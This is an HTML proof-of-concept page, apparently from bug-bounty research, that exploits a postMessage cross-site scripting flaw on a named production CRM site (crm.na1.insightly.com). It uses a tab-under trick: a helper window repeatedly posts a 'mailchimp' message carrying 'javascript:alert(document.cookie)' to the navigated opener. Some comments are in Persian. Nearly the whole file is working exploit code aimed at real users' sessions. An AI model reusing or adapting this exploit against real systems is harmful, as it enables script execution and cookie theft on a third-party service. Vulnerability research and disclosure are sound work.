
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PostMessage XSS - Tab-Under Fixed</title>
  <style>
    body { font-family: Arial; text-align: center; margin-top: 100px; background: #f4f4f4; }
    button { padding: 15px 30px; font-size: 18px; background: #e74c3c; color: #fff; border: none; border-radius: 6px; cursor: pointer; }
    #log { margin-top: 20px; background: #fff; border: 1px solid #ccc; padding: 10px; width: 80%; margin: 20px auto; text-align: left; font-family: monospace; max-height: 200px; overflow: auto; }
  </style>
</head>
<body>
  <h1>🚨 PostMessage XSS (Tab-Under - Fixed)</h1>
  <p>Click the button – alert should appear on insightly.com</p>
  <button id="exploitBtn">Run Exploit</button>
  <div id="log"></div>

  <script>
    const TARGET_URL = "https://crm.na1.insightly.com/list/Organisation/ALL?blade=/details/organisation/174120691";
    const PAYLOAD = "javascript:alert(document.cookie)";

    function log(msg) {
      const logDiv = document.getElementById('log');
      const time = new Date().toLocaleTimeString();
      logDiv.innerHTML += `[${time}] ${msg}<br>`;
      console.log(msg);
    }

    function sendMessages(targetWindow) {
      let count = 0;
      const maxAttempts = 15;
      const interval = setInterval(() => {
        try {
          targetWindow.postMessage({ type: "mailchimp", url: PAYLOAD }, "*");
          log(`✅ Payload sent (${count+1}/${maxAttempts})`);
        } catch (err) {
          log(`❌ Error: ${err.message}`);
        }
        count++;
        if (count >= maxAttempts) clearInterval(interval);
      }, 1500); // هر ۱.۵ ثانیه یکبار
    }

    if (window.opener) {
      // Helper window
      log("Helper: waiting for opener to load target...");
      // تأخیر بیشتر برای اطمینان از بارگذاری کامل صفحه هدف در opener
      setTimeout(() => {
        if (window.opener && !window.opener.closed) {
          log("Helper: sending payloads to opener...");
          sendMessages(window.opener);
          // بستن helper بعد از چند ثانیه
          setTimeout(() => window.close(), 5000);
        } else {
          log("Helper: opener not available.");
        }
      }, 4000); // ۴ ثانیه صبر
    } else {
      // Main window
      log("Main: ready. Click button to start tab-under.");
      document.getElementById('exploitBtn').addEventListener('click', () => {
        log("Main: opening helper window...");
        const helper = window.open(location.href, "helperWindow");
        if (!helper) {
          log("ERROR: Popup blocked! Please allow popups for this site.");
          alert("Please allow popups and try again.");
          return;
        }
        log("Main: redirecting main tab to target...");
        location.href = TARGET_URL;
        // Main tab will now navigate away, helper takes over
      });
    }
  </script>
</body>
</html>
